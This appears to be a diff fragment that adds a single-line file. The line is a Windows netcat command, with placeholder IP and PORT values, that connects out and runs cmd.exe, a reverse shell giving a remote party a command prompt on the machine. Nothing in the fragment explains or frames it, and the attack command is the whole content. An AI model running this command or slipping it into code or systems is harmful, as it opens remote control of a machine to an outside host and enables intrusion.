@@ -1,0 +1,1 @@
+nc.exe -nv IP PORT -e C:\WINDOWS\System32\cmd.exe
